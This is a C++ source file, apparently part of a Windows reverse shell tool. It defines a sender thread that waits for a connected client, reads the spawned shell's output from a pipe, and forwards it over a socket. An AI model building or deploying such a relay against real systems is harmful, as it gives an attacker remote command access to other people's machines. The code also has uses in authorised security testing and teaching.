//#include "reverseShell.h"
#include <windows.h>
#include <iostream>


extern reverseShell_t	shell;
extern BOOL				g_stopProcess;
extern volatile LONG	g_stopRoutines;
extern client_t			client;

char					sendBuf[BUFFER_SIZE] = {};

DWORD	bytes = 0;

#define TELL_CLIENT 1
#define STOP 3
#define IGN 0x07

static BYTE routineNeedToStop(void) {
	EnterCriticalSection(&client.lockStop);
	if (client.stop == TRUE) {
		LeaveCriticalSection(&client.lockStop);
		return (TRUE);
	}
	LeaveCriticalSection(&client.lockStop);
	return (FALSE);
}

static BYTE shellSaidSomething(void) {
	if (!ReadFile(shell.parentRead, sendBuf, BUFFER_SIZE-1, &bytes, NULL)) {
		journalReport(L"Failed to read pipe sender thread\n");
		if (routineNeedToStop() == TRUE)
			return (STOP);
		return (IGN);
	}
	sendBuf[bytes] = '\0';
	return (TELL_CLIENT);
}

static BYTE tellToClient(void) {
	EnterCriticalSection(&shell.lock);
	int clientSentBytes = send(shell.clientSocket, sendBuf, (int)bytes, NULL);
	LeaveCriticalSection(&shell.lock);
	if (clientSentBytes == SOCKET_ERROR) {
		journalReport(L"Failed to send socket sender thread\n");

		return (FAILURE);
	}
	return (SUCCESS);
}

static void waitForClient(void) {
	while (true) {

		EnterCriticalSection(&client.lock);
		if (client.found == FALSE) {
			LeaveCriticalSection(&client.lock);
		} else {
			LeaveCriticalSection(&client.lock);
			break ;
		}
		Sleep(1000);
	}
}

DWORD WINAPI sender(LPVOID) {
	DWORD shellSaid = 0;

	while (true) {

		waitForClient();

		shellSaid = shellSaidSomething();

		if (shellSaid == STOP) {
			notifyStopSignal();
			return (SUCCESS);
		}
		if (shellSaid == TELL_CLIENT) {
			if (tellToClient() == FAILURE) {
				notifyStopSignal();
				return (FAILURE);
			}
		}
		ZeroMemory(sendBuf, BUFFER_SIZE);
		bytes = 0;
	}
	return (SUCCESS);
}